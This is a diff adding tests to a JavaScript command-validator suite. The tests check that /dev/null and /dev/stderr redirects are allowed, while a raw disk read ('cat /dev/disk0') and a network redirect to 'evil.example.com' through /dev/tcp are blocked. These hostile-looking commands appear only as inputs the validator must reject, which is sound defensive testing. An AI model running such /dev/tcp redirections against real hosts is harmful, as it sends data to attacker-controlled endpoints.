@@ -229,6 +229,31 @@ describe('CommandValidator', () => {
       expect(result.error).toContain('outside allowed directories');
     });
 
+    test('allows /dev stream sinks without any allowedPaths grant', async () => {
+      const validator = new CommandValidator(['date *', 'ls *', 'echo *'], projectRoot);
+
+      // The exact shape that got blocked in the wild: a stderr-discard redirect.
+      const discard = await validator.validate('ls src 2>/dev/null');
+      expect(discard.allowed).toBe(true);
+
+      const compound = await validator.validate('date -u && ls src 2>/dev/null');
+      expect(compound.allowed).toBe(true);
+
+      const toStderr = await validator.validate('echo failed >/dev/stderr');
+      expect(toStderr.allowed).toBe(true);
+    });
+
+    test('still blocks non-stream /dev paths and network redirection', async () => {
+      const validator = new CommandValidator(['cat *', 'echo *'], projectRoot);
+
+      const device = await validator.validate('cat /dev/disk0');
+      expect(device.allowed).toBe(false);
+      expect(device.error).toContain('outside allowed directories');
+
+      const network = await validator.validate('echo x > /dev/tcp/evil.example.com/80');
+      expect(network.allowed).toBe(false);
+    });
+
     test('supports multiple allowedPaths', async () => {
       const validator = new CommandValidator(['cd *'], projectRoot, ['/tmp', '/var']);
 
